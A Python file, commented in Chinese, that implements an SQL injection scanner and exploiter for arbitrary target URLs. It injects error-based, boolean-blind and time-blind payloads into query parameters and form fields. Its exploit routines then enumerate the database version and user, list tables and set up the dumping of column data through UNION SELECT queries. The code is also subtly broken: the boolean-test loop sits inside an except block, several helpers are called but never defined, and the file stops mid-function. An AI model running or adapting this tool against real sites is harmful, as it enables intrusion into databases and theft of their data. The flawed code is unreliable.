import requests
import re
import argparse
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from prettytable import PrettyTable
import time

class SQLiScanner:
    def __init__(self, target_url):
        """
        初始化SQL注入扫描器
        :param target_url: 目标URL
        """
        self.target_url = target_url
        self.session = requests.Session()
        # 设置合理的请求头，模拟浏览器访问
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        self.vulnerable_params = []  # 存储发现的表单漏洞
        self.vulnerable_urls = []    # 存储发现的URL参数漏洞
        self.db_type = None          # 数据库类型
        self.time_based_tested = False # 是否已测试时间型注入
    
    def scan_for_sqli(self):
        """
        扫描目标URL寻找SQL注入漏洞
        """
        print(f"[*] 开始扫描 {self.target_url} 的SQL注入漏洞...")
        
        try:
            # 1. 检查URL参数注入
            self.test_url_parameters()
            
            # 2. 检查表单注入
            self.test_forms()
            
            # 3. 检查时间型盲注(如果前两种没发现漏洞)
            if not self.vulnerable_params and not self.vulnerable_urls:
                self.test_time_based_sqli()
            
            # 显示扫描结果
            self.display_results()
            
        except requests.RequestException as e:
            print(f"[-] 请求失败: {str(e)}")
        except Exception as e:
            print(f"[-] 扫描过程中发生错误: {str(e)}")
    
    def test_url_parameters(self):
        """
        测试URL中的查询参数是否存在SQL注入漏洞
        """
        print("\n[*] 正在检查URL参数注入...")
        parsed_url = urlparse(self.target_url)
        if not parsed_url.query:
            print("[-] URL中没有查询参数")
            return
        
        # 获取所有参数名
        params = [param.split('=')[0] for param in parsed_url.query.split('&')]
        print(f"[+] 发现 {len(params)} 个URL参数: {', '.join(params)}")
        
        # 测试每个参数
        for param in params:
            print(f"[*] 测试参数: {param}")
            
            # 测试基于错误的注入
            is_vulnerable, payload, db_type = self.test_error_based_sqli(param, 'url')
            if is_vulnerable:
                print(f"[!] 发现错误型SQL注入漏洞 (参数: {param}, 数据库: {db_type})")
                print(f"[!] 有效载荷: {payload}")
                self.vulnerable_urls.append({
                    'type': 'error',
                    'url': self.target_url,
                    'param': param,
                    'payload': payload,
                    'db_type': db_type
                })
                self.db_type = db_type  # 记住数据库类型
                continue
            
            # 测试布尔型盲注
            is_vulnerable, payload, db_type = self.test_boolean_based_sqli(param, 'url')
            if is_vulnerable:
                print(f"[!] 发现布尔型盲注漏洞 (参数: {param}, 数据库: {db_type})")
                print(f"[!] 有效载荷: {payload}")
                self.vulnerable_urls.append({
                    'type': 'boolean',
                    'url': self.target_url,
                    'param': param,
                    'payload': payload,
                    'db_type': db_type
                })
                self.db_type = db_type
                continue
    
    def test_forms(self):
        """
        测试网页表单是否存在SQL注入漏洞
        """
        print("\n[*] 正在检查表单注入...")
        
        try:
            # 获取页面上的所有表单
            forms = self.extract_forms(self.target_url)
            if not forms:
                print("[-] 未发现表单")
                return
            
            print(f"[+] 发现 {len(forms)} 个表单")
            
            # 测试每个表单
            for i, form in enumerate(forms, 1):
                form_details = self.get_form_details(form)
                print(f"\n[*] 正在测试表单 {i}: {form_details['action']}")
                
                # 测试基于错误的注入
                is_vulnerable, payload, db_type = self.test_error_based_sqli(form_details, 'form')
                if is_vulnerable:
                    print(f"[!] 发现错误型SQL注入漏洞 (表单: {form_details['action']}, 数据库: {db_type})")
                    print(f"[!] 有效载荷: {payload}")
                    self.vulnerable_params.append({
                        'type': 'error',
                        'url': form_details['action'],
                        'method': form_details['method'],
                        'inputs': form_details['inputs'],
                        'payload': payload,
                        'db_type': db_type
                    })
                    self.db_type = db_type
                    continue
                
                # 测试布尔型盲注
                is_vulnerable, payload, db_type = self.test_boolean_based_sqli(form_details, 'form')
                if is_vulnerable:
                    print(f"[!] 发现布尔型盲注漏洞 (表单: {form_details['action']}, 数据库: {db_type})")
                    print(f"[!] 有效载荷: {payload}")
                    self.vulnerable_params.append({
                        'type': 'boolean',
                        'url': form_details['action'],
                        'method': form_details['method'],
                        'inputs': form_details['inputs'],
                        'payload': payload,
                        'db_type': db_type
                    })
                    self.db_type = db_type
        
        except Exception as e:
            print(f"[-] 表单测试出错: {str(e)}")
    
    def test_time_based_sqli(self):
        """
        测试时间型盲注(当其他方法未发现漏洞时使用)
        """
        print("\n[*] 正在检查时间型盲注...")
        self.time_based_tested = True
        
        # 1. 测试URL参数
        parsed_url = urlparse(self.target_url)
        if parsed_url.query:
            params = [param.split('=')[0] for param in parsed_url.query.split('&')]
            for param in params:
                is_vulnerable, payload, db_type = self.test_time_based_param(param)
                if is_vulnerable:
                    print(f"[!] 发现时间型盲注漏洞 (参数: {param}, 数据库: {db_type})")
                    print(f"[!] 有效载荷: {payload}")
                    self.vulnerable_urls.append({
                        'type': 'time',
                        'url': self.target_url,
                        'param': param,
                        'payload': payload,
                        'db_type': db_type
                    })
                    self.db_type = db_type
        
        # 2. 测试表单
        forms = self.extract_forms(self.target_url)
        for form in forms:
            form_details = self.get_form_details(form)
            is_vulnerable, payload, db_type = self.test_time_based_form(form_details)
            if is_vulnerable:
                print(f"[!] 发现时间型盲注漏洞 (表单: {form_details['action']}, 数据库: {db_type})")
                print(f"[!] 有效载荷: {payload}")
                self.vulnerable_params.append({
                    'type': 'time',
                    'url': form_details['action'],
                    'method': form_details['method'],
                    'inputs': form_details['inputs'],
                    'payload': payload,
                    'db_type': db_type
                })
                self.db_type = db_type
    
    def test_error_based_sqli(self, target, target_type):
        """
        测试基于错误的SQL注入
        :param target: 目标参数或表单详情
        :param target_type: 'url'或'form'
        :return: (是否脆弱, 有效载荷, 数据库类型)
        """
        # 不同数据库的错误型注入测试载荷
        test_payloads = [
            # MySQL
            ("'", "MySQL"),
            ("' OR '1'='1", "MySQL"),
            ("' OR 1=1-- ", "MySQL"),
            ("' OR 1=1#", "MySQL"),
            ("1' ORDER BY 1-- ", "MySQL"),
            ("1' UNION SELECT 1,2,3-- ", "MySQL"),
            # SQL Server
            ("'", "SQL Server"),
            ("' OR '1'='1", "SQL Server"),
            ("' OR 1=1--", "SQL Server"),
            ("1;WAITFOR DELAY '0:0:5'--", "SQL Server"),
            # Oracle
            ("'", "Oracle"),
            ("' OR '1'='1", "Oracle"),
            ("' OR 1=1--", "Oracle"),
            ("1) UNION SELECT 1,2,3 FROM dual--", "Oracle"),
            # PostgreSQL
            ("'", "PostgreSQL"),
            ("' OR '1'='1", "PostgreSQL"),
            ("' OR 1=1--", "PostgreSQL"),
            ("1) UNION SELECT 1,2,3--", "PostgreSQL"),
            # SQLite
            ("'", "SQLite"),
            ("' OR '1'='1", "SQLite"),
            ("' OR 1=1--", "SQLite"),
            ("1) UNION SELECT 1,2,3--", "SQLite")
        ]
        
        for payload, db_type in test_payloads:
            try:
                if target_type == 'url':
                    # 测试URL参数
                    parsed_url = urlparse(self.target_url)
                    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                    original_params = {p.split('=')[0]: p.split('=')[1] if '=' in p else '' 
                                     for p in parsed_url.query.split('&')} if parsed_url.query else {}
                    
                    test_params = original_params.copy()
                    test_params[target] = payload
                    query_string = '&'.join([f"{k}={v}" for k, v in test_params.items()])
                    test_url = f"{base_url}?{query_string}"
                    
                    res = self.session.get(test_url, timeout=10)
                else:
                    # 测试表单
                    data = {}
                    for input in target['inputs']:
                        if input['type'] in ['text', 'search', 'hidden', 'password', 'email']:
                            data[input['name']] = payload
                        else:
                            data[input['name']] = input.get('value', '')
                    
                    if target['method'] == 'post':
                        res = self.session.post(target['url'], data=data, timeout=10)
                    else:
                        res = self.session.get(target['url'], params=data, timeout=10)
                
                # 检查响应中是否包含数据库错误信息
                if self.check_db_errors(res.text, db_type):
                    return True, payload, db_type
            
            except requests.RequestException:
                continue
        
        return False, None, None
    
    def test_boolean_based_sqli(self, target, target_type):
        """
        测试布尔型盲注
        :param target: 目标参数或表单详情
        :param target_type: 'url'或'form'
        :return: (是否脆弱, 有效载荷, 数据库类型)
        """
        # 布尔型测试载荷
        boolean_payloads = [
            ("' OR 1=1--", "' OR 1=2--", "Generic"),
            ("1' AND 1=1--", "1' AND 1=2--", "Generic"),
            ("' OR 'a'='a", "' OR 'a'='b", "Generic"),
            ("1' OR 1=1#", "1' OR 1=2#", "MySQL"),
            ("1' AND SLEEP(5)#", "1' AND SLEEP(0)#", "MySQL"),
            ("1' WAITFOR DELAY '0:0:5'--", "1' WAITFOR DELAY '0:0:0'--", "SQL Server"),
            ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))--", "1' AND (SELECT * FROM (SELECT(SLEEP(0))))--", "MySQL")
        ]
        
        # 先获取原始页面内容
        try:
            if target_type == 'url':
                parsed_url = urlparse(self.target_url)
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                original_params = {p.split('=')[0]: p.split('=')[1] if '=' in p else '' 
                                 for p in parsed_url.query.split('&')} if parsed_url.query else {}
                
                # 获取原始响应
                original_query = '&'.join([f"{k}={v}" for k, v in original_params.items()])
                original_url = f"{base_url}?{original_query}"
                original_res = self.session.get(original_url, timeout=10)
                original_content = original_res.text
            else:
                # 获取原始表单响应
                data = {}
                for input in target['inputs']:
                    data[input['name']] = input.get('value', '')
                
                if target['method'] == 'post':
                    original_res = self.session.post(target['url'], data=data, timeout=10)
                else:
                    original_res = self.session.get(target['url'], params=data, timeout=10)
                original_content = original_res.text
        except:
              
            # 测试每个布尔型载荷
            for true_payload, false_payload, db_type in boolean_payloads:
                try:
                    if target_type == 'url':
                        # 测试TRUE条件
                        test_params = original_params.copy()
                        test_params[target] = true_payload
                        true_query = '&'.join([f"{k}={v}" for k, v in test_params.items()])
                        true_url = f"{base_url}?{true_query}"
                        true_res = self.session.get(true_url, timeout=10)
                        
                        # 测试FALSE条件
                        test_params[target] = false_payload
                        false_query = '&'.join([f"{k}={v}" for k, v in test_params.items()])
                        false_url = f"{base_url}?{false_query}"
                        false_res = self.session.get(false_url, timeout=10)
                    else:
                        # 测试表单的TRUE条件
                        true_data = {}
                        for input in target['inputs']:
                            if input['type'] in ['text', 'search', 'hidden', 'password', 'email']:
                                true_data[input['name']] = true_payload
                            else:
                                true_data[input['name']] = input.get('value', '')
                        
                        if target['method'] == 'post':
                            true_res = self.session.post(target['url'], data=true_data, timeout=10)
                        else:
                            true_res = self.session.get(target['url'], params=true_data, timeout=10)
                        
                        # 测试表单的FALSE条件
                        false_data = {}
                        for input in target['inputs']:
                            if input['type'] in ['text', 'search', 'hidden', 'password', 'email']:
                                false_data[input['name']] = false_payload
                            else:
                                false_data[input['name']] = input.get('value', '')
                        
                        if target['method'] == 'post':
                            false_res = self.session.post(target['url'], data=false_data, timeout=10)
                        else:
                            false_res = self.session.get(target['url'], params=false_data, timeout=10)
                    
                    # 比较三个响应的差异
                    true_diff = self.compare_responses(original_content, true_res.text)
                    false_diff = self.compare_responses(original_content, false_res.text)
                    
                    # 如果TRUE条件和FALSE条件的响应有明显差异，则可能存在布尔型盲注
                    if true_diff > 0.2 and false_diff < 0.1:  # 阈值可以根据实际情况调整
                        return True, true_payload, db_type
                
                except requests.RequestException:
                    continue
        
        return False, None, None
    
    def test_time_based_param(self, param):
        """
        测试URL参数的时间型盲注
        :param param: 要测试的参数名
        :return: (是否脆弱, 有效载荷, 数据库类型)
        """
        # 不同数据库的时间型注入测试载荷
        time_payloads = [
            ("1' AND SLEEP(5)#", "MySQL"),
            ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))--", "MySQL"),
            ("1'; WAITFOR DELAY '0:0:5'--", "SQL Server"),
            ("1' OR (SELECT 1 FROM (SELECT SLEEP(5))--", "MySQL"),
            ("1' AND 1=(SELECT 1 FROM PG_SLEEP(5))--", "PostgreSQL"),
            ("1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", "Oracle")
        ]
        
        parsed_url = urlparse(self.target_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        original_params = {p.split('=')[0]: p.split('=')[1] if '=' in p else '' 
                         for p in parsed_url.query.split('&')} if parsed_url.query else {}
        
        for payload, db_type in time_payloads:
            try:
                # 发送正常请求获取基准时间
                normal_params = original_params.copy()
                normal_params[param] = "1"
                normal_query = '&'.join([f"{k}={v}" for k, v in normal_params.items()])
                normal_url = f"{base_url}?{normal_query}"
                
                start_time = time.time()
                self.session.get(normal_url, timeout=10)
                normal_duration = time.time() - start_time
                
                # 发送测试载荷
                test_params = original_params.copy()
                test_params[param] = payload
                test_query = '&'.join([f"{k}={v}" for k, v in test_params.items()])
                test_url = f"{base_url}?{test_query}"
                
                start_time = time.time()
                self.session.get(test_url, timeout=15)  # 设置更长的超时时间
                test_duration = time.time() - start_time
                
                # 检查响应时间是否明显延长
                if test_duration - normal_duration > 4:  # 至少延迟4秒
                    return True, payload, db_type
            
            except requests.RequestException:
                continue
        
        return False, None, None
    
    def test_time_based_form(self, form_details):
        """
        测试表单的时间型盲注
        :param form_details: 表单详情
        :return: (是否脆弱, 有效载荷, 数据库类型)
        """
        # 不同数据库的时间型注入测试载荷
        time_payloads = [
            ("1' AND SLEEP(5)#", "MySQL"),
            ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))--", "MySQL"),
            ("1'; WAITFOR DELAY '0:0:5'--", "SQL Server"),
            ("1' OR (SELECT 1 FROM (SELECT SLEEP(5))--", "MySQL"),
            ("1' AND 1=(SELECT 1 FROM PG_SLEEP(5))--", "PostgreSQL"),
            ("1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", "Oracle")
        ]
        
        for payload, db_type in time_payloads:
            try:
                # 构建测试数据
                data = {}
                for input in form_details['inputs']:
                    if input['type'] in ['text', 'search', 'hidden', 'password', 'email']:
                        data[input['name']] = payload
                    else:
                        data[input['name']] = input.get('value', '')
                
                # 发送正常请求获取基准时间
                normal_data = {}
                for input in form_details['inputs']:
                    normal_data[input['name']] = input.get('value', '1')
                
                start_time = time.time()
                if form_details['method'] == 'post':
                    self.session.post(form_details['url'], data=normal_data, timeout=10)
                else:
                    self.session.get(form_details['url'], params=normal_data, timeout=10)
                normal_duration = time.time() - start_time
                
                # 发送测试请求
                start_time = time.time()
                if form_details['method'] == 'post':
                    self.session.post(form_details['url'], data=data, timeout=15)
                else:
                    self.session.get(form_details['url'], params=data, timeout=15)
                test_duration = time.time() - start_time
                
                # 检查响应时间是否明显延长
                if test_duration - normal_duration > 4:  # 至少延迟4秒
                    return True, payload, db_type
            
            except requests.RequestException:
                continue
        
        return False, None, None
    
    def check_db_errors(self, content, db_type):
        """
        检查响应内容中是否包含特定数据库的错误信息
        :param content: 响应内容
        :param db_type: 数据库类型
        :return: 是否发现错误
        """
        content = content.lower()
        
        # 数据库特定的错误信息
        db_errors = {
            "MySQL": [
                "you have an error in your sql syntax",
                "warning: mysql",
                "mysql server version",
                "mysql_fetch_array",
                "mysql_num_rows",
                "mysql error"
            ],
            "SQL Server": [
                "unclosed quotation mark",
                "microsoft ole db provider for sql server",
                "microsoft sql server",
                "sql server native client",
                "sqlcmd exception",
                "sql exception"
            ],
            "Oracle": [
                "ora-[0-9][0-9][0-9][0-9]",
                "oracle error",
                "oracle.*driver",
                "oracle exception",
                "quoted string not properly terminated"
            ],
            "PostgreSQL": [
                "postgresql query failed",
                "pg_.*error",
                "postgres.*error",
                "syntax error at or near",
                "postgresql warning"
            ],
            "SQLite": [
                "sqlite3.operationalerror",
                "sqlite3.error",
                "sqlite error",
                "syntax error in sqlite"
            ]
        }
        
        if db_type in db_errors:
            for error in db_errors[db_type]:
                if re.search(error, content, re.IGNORECASE):
                    return True
        
        return False
    
    def compare_responses(self, original, new):
        """
        比较两个响应的差异程度
        :param original: 原始响应内容
        :param new: 新响应内容
        :return: 差异比例(0-1)
        """
        # 简单实现：计算行差异比例
        orig_lines = original.split('\n')
        new_lines = new.split('\n')
        
        if not orig_lines or not new_lines:
            return 1.0
        
        min_len = min(len(orig_lines), len(new_lines))
        diff_count = 0
        
        for i in range(min_len):
            if orig_lines[i] != new_lines[i]:
                diff_count += 1
        
        # 加上长度差异
        diff_count += abs(len(orig_lines) - len(new_lines))
        
        return diff_count / max(len(orig_lines), len(new_lines))
    
    def extract_forms(self, url):
        """
        从页面提取所有表单
        :param url: 页面URL
        :return: BeautifulSoup表单对象列表
        """
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            return soup.find_all('form')
        except:
            return []
    
    def get_form_details(self, form):
        """
        提取表单详细信息
        :param form: BeautifulSoup表单对象
        :return: 包含表单详情的字典
        """
        details = {}
        action = form.attrs.get('action', '').lower()
        method = form.attrs.get('method', 'get').lower()
        inputs = []
        
        # 提取所有输入字段
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            input_type = input_tag.attrs.get('type', 'text')
            input_name = input_tag.attrs.get('name')
            input_value = input_tag.attrs.get('value', '')
            
            if input_tag.name == 'select':
                # 对于下拉选择框，获取第一个选项的值
                option = input_tag.find('option')
                if option:
                    input_value = option.attrs.get('value', '')
            
            if input_tag.name == 'textarea':
                input_value = input_tag.text
            
            if input_name:
                inputs.append({
                    'type': input_type,
                    'name': input_name,
                    'value': input_value
                })
        
        details['action'] = urljoin(self.target_url, action)
        details['method'] = method
        details['inputs'] = inputs
        return details
    
    def display_results(self):
        """
        以表格形式显示扫描结果
        """
        if not self.vulnerable_params and not self.vulnerable_urls and not self.time_based_tested:
            print("\n[-] 未发现SQL注入漏洞")
            return
        elif not self.vulnerable_params and not self.vulnerable_urls and self.time_based_tested:
            print("\n[-] 未发现SQL注入漏洞(包括时间型盲注)")
            return
        
        print("\n[+] SQL注入漏洞结果:")
        
        if self.vulnerable_params:
            print("\n表单漏洞:")
            table = PrettyTable()
            table.field_names = ["#", "URL", "方法", "类型", "数据库", "参数", "有效载荷"]
            for i, vuln in enumerate(self.vulnerable_params, 1):
                params = ", ".join([f"{inp['name']}" for inp in vuln['inputs']])
                table.add_row([
                    i, 
                    vuln['url'], 
                    vuln['method'].upper(), 
                    vuln['type'],
                    vuln.get('db_type', '未知'),
                    params, 
                    vuln['payload']
                ])
            print(table)
        
        if self.vulnerable_urls:
            print("\nURL参数漏洞:")
            table = PrettyTable()
            table.field_names = ["#", "URL", "类型", "数据库", "参数", "有效载荷"]
            for i, vuln in enumerate(self.vulnerable_urls, 1):
                table.add_row([
                    i, 
                    f"{vuln['url']}?{vuln['param']}=...", 
                    vuln['type'],
                    vuln.get('db_type', '未知'),
                    vuln['param'], 
                    vuln['payload']
                ])
            print(table)
    
    def exploit_vulnerability(self, vuln):
        """
        利用发现的SQL注入漏洞
        :param vuln: 漏洞详情
        :return: 提取的数据或None
        """
        try:
            if 'inputs' in vuln:  # 表单漏洞
                return self.exploit_form(vuln)
            else:  # URL参数漏洞
                return self.exploit_url_param(vuln)
        except Exception as e:
            print(f"[-] 利用失败: {str(e)}")
            return None
    
    def exploit_form(self, form_data):
        """
        利用表单SQL注入漏洞
        :param form_data: 表单详情
        :return: 提取的数据
        """
        print(f"\n[*] 尝试利用表单漏洞: {form_data['url']}")
        
        # 1. 确定数据库类型
        db_type = form_data.get('db_type', self.detect_db_type(form_data))
        if not db_type:
            print("[-] 无法确定数据库类型")
            return None
        
        print(f"[+] 数据库类型: {db_type}")
        
        # 2. 确定列数
        print("[*] 确定列数...")
        columns = self.determine_columns(form_data, db_type)
        if not columns:
            print("[-] 无法确定列数")
            return None
        
        print(f"[+] 发现 {columns} 列")
        
        # 3. 获取数据库信息
        print("[*] 获取数据库信息...")
        db_info = self.get_database_info(form_data, columns, db_type)
        if not db_info:
            print("[-] 无法获取数据库信息")
            return None
        
        # 4. 获取表名
        print("[*] 获取表名...")
        tables = self.get_tables(form_data, columns, db_type)
        if not tables:
            print("[-] 无法获取表名")
            return None
        
        # 5. 获取每个表的列名和数据
        results = {'database_info': db_info, 'tables': {}}
        for table in tables:
            print(f"\n[*] 处理表: {table}")
            
            # 获取列名
            print("[*] 获取列名...")
            table_columns = self.get_columns(form_data, columns, table, db_type)
            if not table_columns:
                print(f"[-] 无法获取表 {table} 的列名")
                continue
            
            print(f"[+] 列名: {', '.join(table_columns)}")
            
            # 获取数据
            print("[*] 获取数据...")
            data = self.get_table_data(form_data, columns, table, table_columns, db_type)
            
            results['tables'][table] = {
                'columns': table_columns,
                'data': data if data else []
            }
        
        return results
    
    def exploit_url_param(self, url_data):
        """
        利用URL参数SQL注入漏洞
        :param url_data: URL参数详情
        :return: 提取的数据
        """
        print(f"\n[*] 尝试利用URL参数漏洞: {url_data['url']}?{url_data['param']}=...")
        
        # 1. 确定数据库类型
        db_type = url_data.get('db_type', self.detect_db_type(url_data))
        if not db_type:
            print("[-] 无法确定数据库类型")
            return None
        
        print(f"[+] 数据库类型: {db_type}")
        
        # 2. 确定列数
        print("[*] 确定列数...")
        columns = self.determine_url_columns(url_data, db_type)
        if not columns:
            print("[-] 无法确定列数")
            return None
        
        print(f"[+] 发现 {columns} 列")
        
        # 3. 获取数据库信息
        print("[*] 获取数据库信息...")
        db_info = self.get_url_database_info(url_data, columns, db_type)
        if not db_info:
            print("[-] 无法获取数据库信息")
            return None
        
        # 4. 获取表名
        print("[*] 获取表名...")
        tables = self.get_url_tables(url_data, columns, db_type)
        if not tables:
            print("[-] 无法获取表名")
            return None
        
        # 5. 获取每个表的列名和数据
        results = {'database_info': db_info, 'tables': {}}
        for table in tables:
            print(f"\n[*] 处理表: {table}")
            
            # 获取列名
            print("[*] 获取列名...")
            table_columns = self.get_url_columns(url_data, columns, table, db_type)
            if not table_columns:
                print(f"[-] 无法获取表 {table} 的列名")
                continue
            
            print(f"[+] 列名: {', '.join(table_columns)}")
            
            # 获取数据
            print("[*] 获取数据...")
            data = self.get_url_table_data(url_data, columns, table, table_columns, db_type)
            
            results['tables'][table] = {
                'columns': table_columns,
                'data': data if data else []
            }
        
        return results
    
    def detect_db_type(self, target):
        """
        尝试检测数据库类型
        :param target: 目标(表单或URL参数)
        :return: 数据库类型或None
        """
        # 尝试通过错误信息检测
        test_payloads = [
            ("'", "Generic"),
            ("' OR '1'='1", "Generic"),
            ("1' UNION SELECT 1,2,3--", "Generic"),
            ("1' AND SLEEP(5)#", "MySQL"),
            ("1'; WAITFOR DELAY '0:0:5'--", "SQL Server"),
            ("1' AND 1=(SELECT 1 FROM PG_SLEEP(5))--", "PostgreSQL"),
            ("1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", "Oracle")
        ]
        
        for payload, db_type in test_payloads:
            try:
                if 'inputs' in target:  # 表单
                    data = {}
                    for input in target['inputs']:
                        if input['type'] in ['text', 'search', 'hidden', 'password', 'email']:
                            data[input['name']] = payload
                        else:
                            data[input['name']] = input.get('value', '')
                    
                    if target['method'] == 'post':
                        res = self.session.post(target['url'], data=data, timeout=10)
                    else:
                        res = self.session.get(target['url'], params=data, timeout=10)
                else:  # URL参数
                    parsed_url = urlparse(target['url'])
                    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                    original_params = {p.split('=')[0]: p.split('=')[1] if '=' in p else '' 
                                     for p in parsed_url.query.split('&')} if parsed_url.query else {}
                    
                    test_params = original_params.copy()
                    test_params[target['param']] = payload
                    query_string = '&'.join([f"{k}={v}" for k, v in test_params.items()])
                    test_url = f"{base_url}?{query_string}"
                    
                    res = self.session.get(test_url, timeout=10)
                
                if self.check_db_errors(res.text, db_type):
                    return db_type
            
            except requests.RequestException:
                continue
        
        return None
    
    def determine_columns(self, form_data, db_type):
        """
        使用ORDER BY技术确定列数
        :param form_data: 表单详情
        :param db_type: 数据库类型
        :return: 列数或None
        """
        # 根据数据库类型确定注释语法
        comment = self.get_db_comment_syntax(db_type)
        
        for i in range(1, 20):
            payload = f"1' ORDER BY {i}{comment}"
            
            data = {}
            for input in form_data['inputs']:
                if input['type'] in ['text', 'search', 'hidden', 'password', 'email']:
                    data[input['name']] = payload
                else:
                    data[input['name']] = input.get('value', '')
            
            try:
                if form_data['method'] == 'post':
                    res = self.session.post(form_data['url'], data=data, timeout=10)
                else:
                    res = self.session.get(form_data['url'], params=data, timeout=10)
                
                if "unknown column" in res.text.lower() or "order by position" in res.text.lower():
                    return i - 1
            
            except requests.RequestException:
                continue
        
        return None
    
    def determine_url_columns(self, url_data, db_type):
        """
        使用ORDER BY技术确定URL参数注入的列数
        :param url_data: URL参数详情
        :param db_type: 数据库类型
        :return: 列数或None
        """
        # 根据数据库类型确定注释语法
        comment = self.get_db_comment_syntax(db_type)
        
        parsed_url = urlparse(url_data['url'])
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        original_params = {p.split('=')[0]: p.split('=')[1] if '=' in p else '' 
                         for p in parsed_url.query.split('&')} if parsed_url.query else {}
        
        for i in range(1, 20):
            payload = f"1' ORDER BY {i}{comment}"
            
            test_params = original_params.copy()
            test_params[url_data['param']] = payload
            query_string = '&'.join([f"{k}={v}" for k, v in test_params.items()])
            test_url = f"{base_url}?{query_string}"
            
            try:
                res = self.session.get(test_url, timeout=10)
                if "unknown column" in res.text.lower() or "order by position" in res.text.lower():
                    return i - 1
            
            except requests.RequestException:
                continue
        
        return None
    
    def get_db_comment_syntax(self, db_type):
        """
        获取数据库的注释语法
        :param db_type: 数据库类型
        :return: 注释语法字符串
        """
        if db_type.lower() == "mysql":
            return "#"
        elif db_type.lower() == "sql server":
            return "--"
        elif db_type.lower() == "postgresql":
            return "--"
        elif db_type.lower() == "oracle":
            return "--"
        else:
            return "--"  # 默认使用SQL标准注释
    
    def get_database_info(self, form_data, columns, db_type):
        """
        获取数据库信息
        :param form_data: 表单详情
        :param columns: 列数
        :param db_type: 数据库类型
        :return: 数据库信息字典
        """
        # 根据数据库类型构建查询
        if db_type.lower() == "mysql":
            queries = ["database()", "user()", "version()"]
        elif db_type.lower() == "sql server":
            queries = ["db_name()", "user_name()", "@@version"]
        elif db_type.lower() == "postgresql":
            queries = ["current_database()", "current_user", "version()"]
        elif db_type.lower() == "oracle":
            queries = ["SYS_CONTEXT('USERENV','DB_NAME')", "USER", "BANNER FROM v$version WHERE rownum=1"]
        else:
            queries = ["database()", "user()", "version()"]  # 默认MySQL语法
        
        union_select = self.build_union_select(columns, queries, db_type)
        comment = self.get_db_comment_syntax(db_type)
        
        data = {}
        for input in form_data['inputs']:
            if input['type'] in ['text', 'search', 'hidden', 'password', 'email']:
                data[input['name']] = f"1' UNION SELECT {union_select}{comment}"
            else:
                data[input['name']] = input.get('value', '')
        
        try:
            if form_data['method'] == 'post':
                res = self.session.post(form_data['url'], data=data, timeout=10)
            else:
                res = self.session.get(form_data['url'], params=data, timeout=10)
            
            info = {
                'database': self.extract_union_data(res.text, 0),
                'user': self.extract_union_data(res.text, 1),
                'version': self.extract_union_data(res.text, 2)
            }
            
            return info
        
        except requests.RequestException:
            return None
    
    def get_url_database_info(self, url_data, columns, db_type):
        """
        获取URL参数注入的数据库信息
        :param url_data: URL参数详情
        :param columns: 列数
        :param db_type: 数据库类型
        :return: 数据库信息字典
        """
        # 根据数据库类型构建查询
        if db_type.lower() == "mysql":
            queries = ["database()", "user()", "version()"]
        elif db_type.lower() == "sql server":
            queries = ["db_name()", "user_name()", "@@version"]
        elif db_type.lower() == "postgresql":
            queries = ["current_database()", "current_user", "version()"]
        elif db_type.lower() == "oracle":
            queries = ["SYS_CONTEXT('USERENV','DB_NAME')", "USER", "BANNER FROM v$version WHERE rownum=1"]
        else:
            queries = ["database()", "user()", "version()"]  # 默认MySQL语法
        
        union_select = self.build_union_select(columns, queries, db_type)
        comment = self.get_db_comment_syntax(db_type)
        
        parsed_url = urlparse(url_data['url'])
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        original_params = {p.split('=')[0]: p.split('=')[1] if '=' in p else '' 
                         for p in parsed_url.query.split('&')} if parsed_url.query else {}
        
        test_params = original_params.copy()
        test_params[url_data['param']] = f"1' UNION SELECT {union_select}{comment}"
        query_string = '&'.join([f"{k}={v}" for k, v in test_params.items()])
        test_url = f"{base_url}?{query_string}"
        
        try:
            res = self.session.get(test_url, timeout=10)
            
            info = {
                'database': self.extract_union_data(res.text, 0),
                'user': self.extract_union_data(res.text, 1),
                'version': self.extract_union_data(res.text, 2)
            }
            
            return info
        
        except requests.RequestException:
            return None
    
    def get_tables(self, form_data, columns, db_type):
        """
        获取数据库表名
        :param form_data: 表单详情
        :param columns: 列数
        :param db_type: 数据库类型
        :return: 表名列表或None
        """
        # 根据数据库类型构建查询
        if db_type.lower() == "mysql":
            query = "SELECT table_name FROM information_schema.tables WHERE table_schema=database()"
        elif db_type.lower() == "sql server":
            query = "SELECT table_name FROM information_schema.tables"
        elif db_type.lower() == "postgresql":
            query = "SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog', 'information_schema')"
        elif db_type.lower() == "oracle":
            query = "SELECT table_name FROM all_tables"
        elif db_type.lower() == "sqlite":
            query = "SELECT name FROM sqlite_master WHERE type='table'"
        else:
            query = "SELECT table_name FROM information_schema.tables WHERE table_schema=database()"  # 默认MySQL语法
        
        union_select = self.build_union_select(columns, [query], db_type)
        comment = self.get_db_comment_syntax(db_type)
        
        data = {}
        for input in form_data['inputs']:
            if input['type'] in ['text', 'search', 'hidden', 'password', 'email']:
                data[input['name']] = f"1' UNION SELECT {union_select}{comment}"
            else:
                data[input['name']] = input.get('value', '')
        
        try:
            if form_data['method'] == 'post':
